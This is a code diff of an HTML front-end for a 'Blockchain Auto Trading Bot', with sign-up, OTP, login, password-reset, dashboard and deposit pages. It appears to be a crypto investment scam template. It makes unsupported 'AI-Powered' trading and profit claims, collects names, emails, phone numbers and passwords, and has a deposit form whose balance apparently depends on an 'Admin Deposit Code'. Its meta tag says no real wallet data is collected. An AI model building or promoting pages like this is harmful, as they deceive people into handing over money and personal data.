@@ -1,1119 +1,948 @@
-<!DOCTYPE html>   
-<html lang="en">    
-<head>    
-  <meta charset="UTF-8" />    
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />    
-<meta name="description" content="Secure signup form for your blockchain dashboard. We do not collect real wallet data.">    
-<meta name="robots" content="noindex">   
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />   
-  <title>Blockchain Auto Trading Bot</title>    
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>    
-  <style>    
-    body {    
-      background-color: #0b1234;    
-      color: white;    
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;    
-      margin: 0;    
-      padding: 0;    
-    }    
-    main {    
-      max-width: 480px;    
-      margin: 50px auto;    
-      background: #111a3a;    
-      padding: 30px 20px;    
-      border-radius: 12px;    
-      box-shadow: 0 0 15px rgba(0,0,0,0.7);    
-    }    
-    h1, h2 {    
-      color: #f0c040;    
-      text-align: center;    
-      margin-bottom: 20px;    
-    }    
-    p {    
-      font-size: 1rem;    
-      line-height: 1.6;    
-      text-align: center;    
-    }    
-    input, button {    
-      width: 100%;    
-      padding: 12px;    
-      font-size: 16px;    
-      margin-top: 10px;    
-      border-radius: 8px;    
-      border: none;    
-    }    
-    input {    
-      background: #1c2541;    
-      color: #fff;    
-    }    
-    button {    
-      background-color: #0b5ed7;    
-      color: white;    
-      font-weight: bold;    
-      cursor: pointer;    
-    }    
-    button:hover {    
-      background-color: #0946a3;    
-    }    
-    .btn-outline {    
-      background-color: transparent;    
-      border: 2px solid #0b5ed7;    
-      color: #0b5ed7;    
-    }    
-    .btn-outline:hover {    
-      background-color: #0b5ed7;    
-      color: white;    
-    }    
-    .nav-button {    
-      margin-top: 20px;    
-      color: #f0c040;    
-      text-align: center;    
-      cursor: pointer;    
-      display: inline-block;    
-    }    
-    .hidden {    
-      display: none;    
-    }    
-    ul {    
-      text-align: left;    
-      max-width: 400px;    
-      margin: 1rem auto 2rem;    
-      padding-left: 0;    
-      font-size: 0.95rem;    
-      list-style: none;    
-    }    
-    ul li {    
-      margin-bottom: 0.5rem;    
-    }    
-    .error {    
-      color: #ff4d4d;    
-      font-size: 0.9rem;    
-      margin-top: 10px;    
-    }    
-    .loading {    
-      color: #f0c040;    
-      font-weight: bold;    
-      margin-top: 10px;    
-    }    
-  </style>    
-</head>    
-<body>   
-    <!-- PAGE 1: Landing Page -->
-    <section id="page1">
-      <h1>Welcome to Blockchain Auto Trading Bot</h1>
-      <p><strong>24/7 Intelligent Crypto Trading. Powered by Blockchain.</strong><br><br>
-        Take your crypto trading to the next level with our cutting-edge Blockchain Auto Trading Bot — a fully automated system that leverages advanced algorithms, real-time market data, and smart contract technology to trade your assets efficiently and securely.
-      </p>
-      <ul>
-        <li>✅ AI-Powered Strategy Execution</li>
-        <li>✅ Integrated with Binance, Ethereum, BSC & More</li>
-        <li>✅ Auto-Buy/Sell at Optimal Market Conditions</li>
-        <li>✅ Secure, Transparent, and On-Chain Verified</li>
-        <li>✅ Real-Time Profit Dashboard & Alerts</li>
-      </ul>
-      <p><strong>You stay in control.</strong><br>
-        Set your trading goals, stop-loss limits, and preferred pairs. Let the bot do the rest while you monitor your profits from an intuitive dashboard.
-      </p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Blockchain Auto-Trading System</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+<style>
+  /* Dark Blue Gradient Background & font */
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(180deg, #0b1a2d 0%, #07111f 100%);
+    color: #e0e7ff;
+    overflow-x: hidden;
+  }
+  /* Container for all pages */
+  .page {
+    display: none;
+    padding: 2rem 1.5rem;
+    max-width: 900px;
+    margin: 0 auto;
+    min-height: 100vh;
+    box-sizing: border-box;
+  }
+  .active {
+    display: block;
+  }
+  /* Buttons styling */
+  button {
+    background-color: #2a72d6;
+    border: none;
+    border-radius: 8px;
+    padding: 12px 28px;
+    margin: 0.5rem 0.5rem 0.5rem 0;
+    font-size: 1rem;
+    color: white;
+    cursor: pointer;
+    font-weight: 600;
+    transition: background-color 0.25s ease;
+  }
+  button:hover {
+    background-color: #1952a6;
+  }
+  .btn-outline {
+    background: transparent;
+    border: 2px solid #4fc3f7;
+    color: #4fc3f7;
+  }
+  .btn-outline:hover {
+    background: #4fc3f7;
+    color: #07111f;
+  }
+  input[type="text"], input[type="email"], input[type="password"] {
+    width: 100%;
+    max-width: 400px;
+    padding: 10px 12px;
+    margin: 0.5rem 0 1rem 0;
+    border-radius: 6px;
+    border: 1.5px solid #4fc3f7;
+    background-color: #0b1a2d;
+    color: #e0e7ff;
+    font-size: 1rem;
+    box-sizing: border-box;
+  }
+  input::placeholder {
+    color: #7daedc;
+  }
+  h1, h2 {
+    color: #4fc3f7;
+    font-weight: 700;
+  }
+  /* Navigation back button */
+  .nav-button {
+    cursor: pointer;
+    font-weight: 700;
+    color: #4fc3f7;
+    margin-top: 1rem;
+    user-select: none;
+    display: inline-block;
+  }
+  /* Logo */
+  .logo {
+    width: 110px;
+    margin-bottom: 2rem;
+    filter: drop-shadow(0 0 4px #4fc3f7);
+  }
+  /* Partners logos container */
+  .partners {
+    display: flex;
+    justify-content: center;
+    gap: 1.5rem;
+    margin-top: 2rem;
+    flex-wrap: wrap;
+  }
+  .partners img {
+    height: 36px;
+    filter: brightness(0) invert(1);
+  }
+  /* Error message */
+  .error {
+    color: #f44336;
+    margin-top: -0.5rem;
+    margin-bottom: 1rem;
+  }
+  /* Success popup */
+  #successPopup {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #198754;
+    padding: 15px 25px;
+    border-radius: 8px;
+    color: white;
+    font-weight: 600;
+    display: none;
+    z-index: 1000;
+    box-shadow: 0 0 10px #198754;
+  }
+  /* Homepage content styling */
+  #homepage section {
+    margin-bottom: 2rem;
+  }
+  #coin-list {
+    max-height: 180px;
+    overflow-y: auto;
+    border: 1px solid #4fc3f7;
+    border-radius: 8px;
+    padding: 1rem;
+    background-color: #0b1a2d;
+  }
+  #coin-list ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+  }
+  #coin-list li {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 8px;
+    font-weight: 600;
+  }
+  #coin-list img {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+  }
+  /* TradingView iframe styling */
+  iframe {
+    border-radius: 12px;
+    border: none;
+    width: 100%;
+    max-width: 900px;
+    height: 400px;
+  }
+  /* Captcha container */
+  #captchaContainer {
+    margin: 1rem 0;
+    display: flex;
+    justify-content: center;
+  }
+</style>
+</head>
+<body>
 
-  <!-- Buttons to navigate to Sign Up and Login pages -->
-  <button onclick="showPage('1i')">Sign Up</button>
-  <button class="btn-outline" onclick="showPage('1iii')">Login</button>
+<!-- PAGE 0: Landing Page -->
+<section id="page0" class="page active" role="main" aria-label="Landing page">
+  <img src="https://seeklogo.com/images/B/blockchain-logo-9D3FE9D96F-seeklogo.com.png" alt="Blockchain Logo" class="logo" />
+  <h1>Welcome to Blockchain Auto Trading Bot</h1>
+  <p><strong>24/7 Intelligent Crypto Trading. Powered by Blockchain.</strong><br><br>
+    Take your crypto trading to the next level with our cutting-edge Blockchain Auto Trading Bot — a fully automated system that leverages advanced algorithms, real-time market data, and smart contract technology to trade your assets efficiently and securely.
+  </p>
+  <ul>
+    <li>✅ AI-Powered Strategy Execution</li>
+    <li>✅ Integrated with Binance, Ethereum, BSC & More</li>
+    <li>✅ Auto-Buy/Sell at Optimal Market Conditions</li>
+    <li>✅ Secure, Transparent, and On-Chain Verified</li>
+    <li>✅ Real-Time Profit Dashboard & Alerts</li>
+  </ul>
+  <p><strong>You stay in control.</strong><br>
+    Set your trading goals, stop-loss limits, and preferred pairs. Let the bot do the rest while you monitor your profits from an intuitive dashboard.
+  </p>
+  <div>
+    <button id="btnGoSignUp">Sign Up</button>
+    <button class="btn-outline" id="btnGoLogin">Login</button>
+  </div>
+  <div class="partners" aria-label="Supported exchanges and coins">
+    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance" />
+    <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Ethereum" />
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" />
+  </div>
 </section>
-    
 
-<!-- Page 1i: Sign Up -->
-<section id="page1i" class="hidden">
+<!-- PAGE 1: Sign Up -->
+<section id="page1" class="page" aria-label="Sign Up page">
   <h2>Sign Up</h2>
-  <form id="signupForm" style="max-width: 400px; margin: auto;">
-    <input type="text" id="full_name" name="full_name" placeholder="Full Name" required style="width: 100%; margin-bottom: 12px;" />
-    <input type="email" id="user_email" name="user_email" placeholder="Email Address" required style="width: 100%; margin-bottom: 12px;" />
-    <input type="text" id="country" name="country" placeholder="Country" required style="width: 100%; margin-bottom: 12px;" />
+  <input type="text" id="signFullName" placeholder="Full Name" autocomplete="name" required />
+  <input type="email" id="signEmail" placeholder="Email Address" autocomplete="email" required />
+  <input type="password" id="signPassword" placeholder="Password" autocomplete="new-password" required />
+  <button id="btnSignUpSubmit">Sign Up</button>
+  <div class="nav-button" tabindex="0" role="button" aria-label="Back to Landing Page" id="btnBackToLandingFromSignUp">&lt; Back</div>
+</section>
 
-    <label for="phone_country_code" style="color:#f0c040; font-weight: bold; margin-bottom: 4px; display: block;">Select Country Code</label>
-    <select id="phone_country_code" name="phone_country_code" required style="width: 100%; padding: 10px; margin-bottom: 12px; border-radius: 8px; background:#1c2541; color:#fff; border:none;">
-      <option value="+376">+376 Andorra</option>
-      <option value="+971">+971 United Arab Emirates</option>
-      <option value="+93">+93 Afghanistan</option>
-      <option value="+355">+355 Albania</option>
-      <option value="+374">+374 Armenia</option>
-      <option value="+61">+61 Australia</option>
-      <option value="+43">+43 Austria</option>
-      <option value="+994">+994 Azerbaijan</option>
-      <option value="+880">+880 Bangladesh</option>
-      <option value="+375">+375 Belarus</option>
-      <option value="+32">+32 Belgium</option>
-      <option value="+501">+501 Belize</option>
-      <option value="+229">+229 Benin</option>
-      <option value="+591">+591 Bolivia</option>
-      <option value="+387">+387 Bosnia and Herzegovina</option>
-      <option value="+55">+55 Brazil</option>
-      <option value="+673">+673 Brunei</option>
-      <option value="+359">+359 Bulgaria</option>
-      <option value="+226">+226 Burkina Faso</option>
-      <option value="+257">+257 Burundi</option>
-      <option value="+855">+855 Cambodia</option>
-      <option value="+237">+237 Cameroon</option>
-      <option value="+1">+1 Canada</option>
-      <option value="+238">+238 Cape Verde</option>
-      <option value="+236">+236 Central African Republic</option>
-      <option value="+235">+235 Chad</option>
-      <option value="+56">+56 Chile</option>
-      <option value="+86">+86 China</option>
-      <option value="+61">+61 Christmas Island</option>
-      <option value="+61">+61 Cocos Islands</option>
-      <option value="+57">+57 Colombia</option>
-      <option value="+269">+269 Comoros</option>
-      <option value="+243">+243 Congo (DRC)</option>
-      <option value="+242">+242 Congo (Republic)</option>
-      <option value="+682">+682 Cook Islands</option>
-      <option value="+506">+506 Costa Rica</option>
-      <option value="+385">+385 Croatia</option>
-      <option value="+53">+53 Cuba</option>
-      <option value="+357">+357 Cyprus</option>
-      <option value="+420">+420 Czech Republic</option>
-      <option value="+45">+45 Denmark</option>
-      <option value="+253">+253 Djibouti</option>
-      <option value="+1767">+1767 Dominica</option>
-      <option value="+1809">+1809 Dominican Republic</option>
-      <option value="+593">+593 Ecuador</option>
-      <option value="+20">+20 Egypt</option>
-      <option value="+503">+503 El Salvador</option>
-      <option value="+240">+240 Equatorial Guinea</option>
-      <option value="+291">+291 Eritrea</option>
-      <option value="+372">+372 Estonia</option>
-      <option value="+251">+251 Ethiopia</option>
-      <option value="+500">+500 Falkland Islands</option>
-      <option value="+298">+298 Faroe Islands</option>
-      <option value="+679">+679 Fiji</option>
-      <option value="+358">+358 Finland</option>
-      <option value="+33">+33 France</option>
-      <option value="+594">+594 French Guiana</option>
-      <option value="+689">+689 French Polynesia</option>
-      <option value="+241">+241 Gabon</option>
-      <option value="+220">+220 Gambia</option>
-      <option value="+995">+995 Georgia</option>
-      <option value="+49">+49 Germany</option>
-      <option value="+233">+233 Ghana</option>
-      <option value="+350">+350 Gibraltar</option>
-      <option value="+30">+30 Greece</option>
-      <option value="+299">+299 Greenland</option>
-      <option value="+1473">+1473 Grenada</option>
-      <option value="+590">+590 Guadeloupe</option>
-      <option value="+502">+502 Guatemala</option>
-      <option value="+44">+44 United Kingdom</option>
-      <option value="+224">+224 Guinea</option>
-      <option value="+245">+245 Guinea-Bissau</option>
-      <option value="+592">+592 Guyana</option>
-      <option value="+509">+509 Haiti</option>
-      <option value="+504">+504 Honduras</option>
-      <option value="+852">+852 Hong Kong</option>
-      <option value="+36">+36 Hungary</option>
-      <option value="+354">+354 Iceland</option>
-      <option value="+91">+91 India</option>
-      <option value="+62">+62 Indonesia</option>
-      <option value="+98">+98 Iran</option>
-      <option value="+964">+964 Iraq</option>
-      <option value="+353">+353 Ireland</option>
-      <option value="+972">+972 Israel</option>
-      <option value="+39">+39 Italy</option>
-      <option value="+1876">+1876 Jamaica</option>
-      <option value="+81">+81 Japan</option>
-      <option value="+44">+44 Jersey</option>
-      <option value="+962">+962 Jordan</option>
-      <option value="+7">+7 Kazakhstan</option>
-      <option value="+254">+254 Kenya</option>
-      <option value="+686">+686 Kiribati</option>
-      <option value="+965">+965 Kuwait</option>
-      <option value="+996">+996 Kyrgyzstan</option>
-      <option value="+856">+856 Laos</option>
-      <option value="+371">+371 Latvia</option>
-      <option value="+961">+961 Lebanon</option>
-      <option value="+266">+266 Lesotho</option>
-      <option value="+231">+231 Liberia</option>
-      <option value="+218">+218 Libya</option>
-      <option value="+423">+423 Liechtenstein</option>
-      <option value="+370">+370 Lithuania</option>
-      <option value="+352">+352 Luxembourg</option>
-      <option value="+853">+853 Macau</option>
-      <option value="+261">+261 Madagascar</option>
-      <option value="+265">+265 Malawi</option>
-      <option value="+60">+60 Malaysia</option>
-      <option value="+960">+960 Maldives</option>
-      <option value="+223">+223 Mali</option>
-      <option value="+356">+356 Malta</option>
-      <option value="+230">+230 Mauritius</option>
-      <option value="+52">+52 Mexico</option>
-      <option value="+691">+691 Micronesia</option>
-      <option value="+373">+373 Moldova</option>
-      <option value="+377">+377 Monaco</option>
-      <option value="+976">+976 Mongolia</option>
-      <option value="+382">+382 Montenegro</option>
-      <option value="+1664">+1664 Montserrat</option>
-      <option value="+212">+212 Morocco</option>
-      <option value="+258">+258 Mozambique</option>
-      <option value="+95">+95 Myanmar</option>
-      <option value="+264">+264 Namibia</option>
-      <option value="+674">+674 Nauru</option>
-      <option value="+977">+977 Nepal</option>
-      <option value="+31">+31 Netherlands</option>
-      <option value="+687">+687 New Caledonia</option>
-      <option value="+64">+64 New Zealand</option>
-      <option value="+505">+505 Nicaragua</option>
-      <option value="+227">+227 Niger</option>
-      <option value="+234" selected>+234 Nigeria</option>
-      <option value="+683">+683 Niue</option>
-      <option value="+672">+672 Norfolk Island</option>
-      <option value="+850">+850 North Korea</option>
-      <option value="+47">+47 Norway</option>
-      <option value="+968">+968 Oman</option>
-      <option value="+92">+92 Pakistan</option>
-      <option value="+680">+680 Palau</option>
-      <option value="+970">+970 Palestine</option>
-      <option value="+507">+507 Panama</option>
-      <option value="+675">+675 Papua New Guinea</option>
-      <option value="+595">+595 Paraguay</option>
-      <option value="+51">+51 Peru</option>
-      <option value="+63">+63 Philippines</option>
-      <option value="+48">+48 Poland</option>
-      <option value="+351">+351 Portugal</option>
-      <option value="+1">+1 Puerto Rico</option>
-      <option value="+974">+974 Qatar</option>
-      <option value="+40">+40 Romania</option>
-      <option value="+7">+7 Russia</option>
-      <option value="+250">+250 Rwanda</option>
-      <option value="+262">+262 Reunion</option>
-      <option value="+685">+685 Samoa</option>
-      <option value="+378">+378 San Marino</option>
-      <option value="+239">+239 Sao Tome and Principe</option>
-      <option value="+966">+966 Saudi Arabia</option>
-      <option value="+221">+221 Senegal</option>
-      <option value="+381">+381 Serbia</option>
-      <option value="+248">+248 Seychelles</option>
-      <option value="+232">+232 Sierra Leone</option>
-      <option value="+65">+65 Singapore</option>
-      <option value="+421">+421 Slovakia</option>
-      <option value="+386">+386 Slovenia</option>
-      <option value="+677">+677 Solomon Islands</option>
-      <option value="+677">+677 Solomon Islands</option>
-      <option value="+252">+252 Somalia</option>
-      <option value="+27">+27 South Africa</option>
-      <option value="+82">+82 South Korea</option>
-      <option value="+211">+211 South Sudan</option>
-      <option value="+34">+34 Spain</option>
-      <option value="+94">+94 Sri Lanka</option>
-      <option value="+249">+249 Sudan</option>
-      <option value="+597">+597 Suriname</option>
-      <option value="+47">+47 Svalbard and Jan Mayen</option>
-      <option value="+268">+268 Eswatini</option>
-      <option value="+46">+46 Sweden</option>
-      <option value="+41">+41 Switzerland</option>
-      <option value="+963">+963 Syria</option>
-      <option value="+886">+886 Taiwan</option>
-      <option value="+992">+992 Tajikistan</option>
-      <option value="+255">+255 Tanzania</option>
-      <option value="+66">+66 Thailand</option>
-      <option value="+670">+670 Timor-Leste</option>
-      <option value="+228">+228 Togo</option>
-      <option value="+690">+690 Tokelau</option>
-      <option value="+676">+676 Tonga</option>
-      <option value="+1868">+1868 Trinidad and Tobago</option>
-      <option value="+216">+216 Tunisia</option>
-      <option value="+90">+90 Turkey</option>
-      <option value="+993">+993 Turkmenistan</option>
-      <option value="+1649">+1649 Turks and Caicos Islands</option>
-      <option value="+688">+688 Tuvalu</option>
-      <option value="+256">+256 Uganda</option>
-      <option value="+380">+380 Ukraine</option>
-      <option value="+971">+971 United Arab Emirates</option>
-      <option value="+44">+44 United Kingdom</option>
-      <option value="+1">+1 United States</option>
-      <option value="+598">+598 Uruguay</option>
-      <option value="+998">+998 Uzbekistan</option>
-      <option value="+678">+678 Vanuatu</option>
-      <option value="+39">+39 Vatican City</option>
-      <option value="+58">+58 Venezuela</option>
-      <option value="+84">+84 Vietnam</option>
-      <option value="+681">+681 Wallis and Futuna</option>
-      <option value="+212">+212 Western Sahara</option>
-      <option value="+967">+967 Yemen</option>
-      <option value="+260">+260 Zambia</option>
-      <option value="+263">+263 Zimbabwe</option>
+<!-- PAGE 1i: OTP Verification -->
+<section id="page1i" class="page" aria-label="Email Verification page">
+  <h2>Email Verification</h2>
+  <p>Check your email and enter the 6-digit code:</p>
+  <input type="text" id="verificationCode" placeholder="Enter Verification Code" maxlength="6" autocomplete="one-time-code" required />
+  <button id="btnVerifyCode">Verify</button>
+  <p id="countdownText"></p>
+  <button id="btnResendCode">Resend Code</button>
+  <div class="nav-button" tabindex="0" role="button" aria-label="Back to Sign Up" id="btnBackToSignUpFromVerify">&lt; Back</div>
+  <p class="error" id="otpError" aria-live="assertive"></p>
+</section>
+
+<!-- PAGE 2: Login -->
+<section id="page2" class="page" aria-label="Login page">
+  <h2>Login</h2>
+  <form id="loginForm" novalidate>
+    <input type="email" id="loginEmail" name="login_email" placeholder="Email" autocomplete="email" required />
+    <input type="password" id="loginPassword" name="login_password" placeholder="Password" autocomplete="current-password" required />
+    <button type="submit" id="btnLoginSubmit">Login</button>
+    <p class="error" id="loginError" aria-live="assertive"></p>
+  </form>
+  <button id="btnForgotPassword" class="btn-outline" aria-label="Forgot Password">Forgot Password / Reset</button>
+  <div class="nav-button" tabindex="0" role="button" aria-label="Back to Landing Page" id="btnBackToLandingFromLogin">&lt; Back</div>
+</section>
+
+<!-- PAGE 3i: Forgot Password / CAPTCHA Verification -->
+<section id="page3i" class="page" aria-label="Forgot Password CAPTCHA Verification">
+  <h2>Verify You're Human</h2>
+  <div id="captchaContainer"></div>
+  <button id="btnCaptchaVerify" disabled>Verify</button>
+  <div class="nav-button" tabindex="0" role="button" aria-label="Back to Login" id="btnBackToLoginFromCaptcha">&lt; Back</div>
+  <p class="error" id="captchaError" aria-live="assertive"></p>
+</section>
+
+<!-- PAGE 3ii: Enter New Password -->
+<section id="page3ii" class="page" aria-label="Reset Password">
+  <h2>Set New Password</h2>
+  <input type="password" id="newPassword" placeholder="New Password" autocomplete="new-password" required />
+  <input type="password" id="confirmNewPassword" placeholder="Confirm New Password" autocomplete="new-password" required />
+  <button id="btnConfirmNewPassword">Confirm</button>
+  <div class="nav-button" tabindex="0" role="button" aria-label="Back to Login" id="btnBackToLoginFromReset">&lt; Back</div>
+  <p class="error" id="resetPasswordError" aria-live="assertive"></p>
+</section>
+
+<!-- PAGE 3: Homepage -->
+<section id="page3" class="page" aria-label="Homepage Dashboard">
+  <h2>Welcome to Your Dashboard</h2>
+  <p id="welcomeUserName"></p>
+  <section>
+    <h3>Live TradingView Chart</h3>
+    <!-- TradingView Widget -->
+    <iframe
+      src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_01&symbol=BINANCE:BTCUSDT&interval=60&hidesidetoolbar=1&symboledit=1&saveimage=1&toolbarbg=f1f3f6&studies=[]&theme=dark&style=1&timezone=Etc/UTC&studies_overrides={}&overrides={}&enabled_features=[]&disabled_features=[]&locale=en&utm_source=blockchain&utm_medium=widget&utm_campaign=chart"
+      allowfullscreen
+      loading="lazy"
+      title="Live BTC/USDT TradingView Chart"
+      style="width:100%;height:400px;border:none;border-radius:12px;"
+    ></iframe>
+  </section>
+
+  <section>
+    <h3>Live Coin Prices (CoinGecko API)</h3>
+    <div id="coin-list" aria-live="polite" aria-atomic="true" aria-relevant="additions">
+      <ul id="coinListUL"></ul>
+    </div>
+  </section>
+
+  <section>
+    <h3>Market News (TradingView)</h3>
+    <iframe
+      src="https://s.tradingview.com/embed-widget/tickers/?locale=en"
+      style="width: 100%; height: 300px; border-radius: 12px; border:none;"
+      frameborder="0"
+      scrolling="no"
+      title="Market News"
+      loading="lazy"
+    ></iframe>
+  </section>
+
+  <button id="btnViewPortfolio" class="btn-outline" aria-label="View Main Portfolio">View Main Portfolio</button>
+  <button id="btnLogout" class="btn-outline" aria-label="Logout">Logout</button>
+</section>
+
+
+<!-- Auto-Trading Portfolio Page4 -->
+<div id="page4" class="page" style="
+  display:none;
+  background-color:#0B0E11;
+  color:#FFFFFF;
+  padding:24px;
+  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  min-height:100vh;
+  box-sizing:border-box;
+">
+
+  <h2 style="margin-bottom:32px; font-weight:700; font-size:1.8rem;">
+    🤖 Auto-Trading Portfolio
+  </h2>
+
+  <!-- Total Balance -->
+  <section style="margin-bottom:32px;">
+    <strong style="font-size:1.25rem; font-weight:700;">Total Balance</strong>
+    <div id="dashboardBalance" style="
+      font-size:2rem;
+      font-weight:800;
+      margin-top:8px;
+      color:#4fc3f7;
+      letter-spacing: 0.02em;
+    ">$0.00</div>
+  </section>
+
+  <!-- Live Prices Section -->
+  <section style="
+    background:#12171d;
+    padding:20px;
+    border-radius:16px;
+    margin-bottom:40px;
+  ">
+    <strong style="font-size:1.25rem; font-weight:700; display:block; margin-bottom:16px;">
+      Live Prices
+    </strong>
+    <div id="livePrices" style="
+      display:flex;
+      gap:32px;
+      flex-wrap:wrap;
+      font-weight:700;
+      font-size:1.125rem;
+      justify-content:space-between;
+    ">
+      <div>BTC: <span id="btcPrice" style="color:#f7931a;">$0.00</span></div>
+      <div>ETH: <span id="ethPrice" style="color:#627eea;">$0.00</span></div>
+      <div>BNB: <span id="bnbPrice" style="color:#f3ba2f;">$0.00</span></div>
+      <div>USDT: <span id="usdtPrice" style="color:#26a17b;">$0.00</span></div>
+    </div>
+  </section>
+
+  <!-- TradingView Live Chart -->
+  <section style="
+    background:#12171d;
+    border-radius:16px;
+    padding:16px;
+    margin-bottom:40px;
+  ">
+    <strong style="font-size:1.25rem; font-weight:700; display:block; margin-bottom:16px;">
+      📈 Live Price Performance Chart
+    </strong>
+    <div id="tradingview_chart" style="height:400px; border-radius:12px; overflow:hidden;"></div>
+  </section>
+
+  <!-- Deposit Section -->
+  <section style="
+    background:#12171d;
+    padding:24px;
+    border-radius:16px;
+    margin-bottom:40px;
+  ">
+    <h3 style="font-weight:700; margin-bottom:24px;">💰 Deposit Funds</h3>
+
+    <label for="depositAmount" style="display:block; font-weight:600; margin-bottom:8px;">Deposit Amount (USD):</label>
+    <input type="number" id="depositAmount" placeholder="Enter amount" style="
+      width:100%;
+      padding:14px;
+      font-size:1rem;
+      border-radius:12px;
+      border:none;
+      background:#0b131e;
+      color:#fff;
+      margin-bottom:20px;
+    " />
+
+    <label for="depositNetwork" style="display:block; font-weight:600; margin-bottom:8px;">Network:</label>
+    <select id="depositNetwork" style="
+      width:100%;
+      padding:14px;
+      font-size:1rem;
+      border-radius:12px;
+      border:none;
+      background:#0b131e;
+      color:#fff;
+      margin-bottom:20px;
+    ">
+      <option value="BTC">Bitcoin</option>
+      <option value="ETH">Ethereum</option>
+      <option value="BNB">Binance Smart Chain</option>
+      <option value="SOL">Solana</option>
+      <option value="TRX">Tron</option>
     </select>
 
-    <input type="tel" id="phone_number" name="phone_number" placeholder="Phone Number (without country code)" required style="width: 100%; margin-bottom: 12px; padding: 10px; border-radius: 8px; background:#1c2541; color:#fff; border:none;" />
+    <label for="depositCode" style="display:block; font-weight:600; margin-bottom:8px;">Admin Deposit Code:</label>
+    <input type="text" id="depositCode" placeholder="Enter deposit code" style="
+      width:100%;
+      padding:14px;
+      font-size:1rem;
+      border-radius:12px;
+      border:none;
+      background:#0b131e;
+      color:#fff;
+      margin-bottom:24px;
+    " />
 
-    <!-- Password fields -->
-    <input type="password" id="password" name="password" placeholder="Password" required minlength="6" style="width: 100%; margin-bottom: 12px;" />
-    <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Confirm Password" required minlength="6" style="width: 100%; margin-bottom: 12px;" />
+    <button id="btnConfirmDeposit" style="
+      width:100%;
+      background:#1F6FEB;
+      padding:16px;
+      font-weight:700;
+      border:none;
+      border-radius:16px;
+      font-size:1.1rem;
+      color:#fff;
+      cursor:pointer;
+      transition: background-color 0.3s;
+    " onmouseover="this.style.background='#155FCC'" onmouseout="this.style.background='#1F6FEB'">
+      Confirm Deposit
+    </button>
+  </section>
 
-    <!-- Password mismatch alert -->
-    <div id="passwordError" style="color: red; display: none; font-size: 14px; margin-bottom: 12px;">
-      ❌ Passwords do not match.
-    </div>
+  <!-- Receive Section -->
+  <section style="
+    background:#12171d;
+    padding:24px;
+    border-radius:16px;
+    margin-bottom:40px;
+  ">
+    <h3 style="font-weight:700; margin-bottom:24px;">📥 Receive Crypto</h3>
 
-    <button type="submit" onclick="showPage('1ii')" style="background-color:#1a2b6c; color:white; padding: 12px; border-radius: 8px; border: none;">Sign Up</button>
-  </form>
+    <label for="receiveToken" style="display:block; font-weight:600; margin-bottom:12px;">Select Token:</label>
+    <select id="receiveToken" style="
+      width:100%;
+      padding:14px;
+      font-size:1rem;
+      border-radius:12px;
+      border:none;
+      background:#0b131e;
+      color:#fff;
+      margin-bottom:24px;
+    ">
+      <option value="USDT">USDT</option>
+      <option value="BTC">BTC</option>
+      <option value="ETH">ETH</option>
+      <option value="BNB">BNB</option>
+      <option value="SOL">SOL</option>
+      <option value="TRX">TRX</option>
+    </select>
 
-  <div class="nav-button" onclick="showPage('1')" style="margin-top: 20px; color: #f0c040; text-align: center; cursor: pointer; font-weight: bold;">🔙 Back</div>
-</section>
-<!-- PAGE 1ii: Verification -->
-<section id="page1ii" style="display: none;">
-  <h2>Email Verification</h2>
-  <input type="text" id="verificationCode" placeholder="Enter Verification Code" />
-  <button id="verifyBtn" style="background-color:#1a2b6c; color:white;">Verify</button>
-  <p id="verificationError" class="error" style="color:red;"></p>
-  <div class="nav-button" onclick="showPage('1i')">🔙 Back</div>
-</section>
-    
-  <!--PAGE 1iii: Login Page -->
-    <section id="page1iii" class="hidden">
-      <h2>Login</h2>
-      <form id="loginForm">
-        <input type="email" name="login_email" placeholder="Email" required />
-        <input type="password" name="login_password" placeholder="Password" required />
-        <button type="submit">Login</button>
-        <p class="error" id="loginError"></p>
-      </form>
-      <div class="nav-button" onclick="showPage('1')">🔙 Back to Welcome</div>
-    </section>
-  
-    
-  <!-- Page 3: Main Dashboard -->     
-    <div id="page3" class="page" style="display:none; background-color:#0B0E11; color:white; padding:20px; font-family:sans-serif;">      
-  <h2 style="margin-bottom:20px;">📊 Dashboard</h2>      
-  <div style="margin-bottom:20px;">      
-    <strong>Total Balance:</strong>      
-    <span id="dashboardBalance">$0.00</span>      
-  </div>       
-  <!-- Live Prices -->        
-  <div style="margin-bottom:20px;">      
-    <strong>Live Prices:</strong><br>      
-    BTC: <span id="btcPrice">$0.00</span><br>      
-    ETH: <span id="ethPrice">$0.00</span><br>      
-    BNB: <span id="bnbPrice">$0.00</span><br>      
-    USDT: <span id="usdtPrice">$0.00</span>      
-  </div> 
-  
-   <!-- Deposit Section -->        
-  <div style="margin-bottom:20px;">      
-    <label for="depositAmount">Deposit Amount (USD):</label>      
-    <input type="number" id="depositAmount" placeholder="Amount" style="width:100%; padding:8px; margin:4px 0 10px;" />      <label for="depositNetwork">Network:</label>      
-<select id="depositNetwork" style="width:100%; padding:8px; margin-bottom:10px;">      
-  <option value="BTC">Bitcoin</option>      
-  <option value="ETH">Ethereum</option>      
-  <option value="BNB">Binance Smart Chain</option>      
-  <option value="SOL">Solana</option>      
-  <option value="TRX">Tron</option>      
-</select>      
-  
-<label for="depositCode">Admin Deposit Code:</label>      
-<input type="text" id="depositCode" placeholder="Enter deposit code" style="width:100%; padding:8px; margin-bottom:10px;" />      
-  
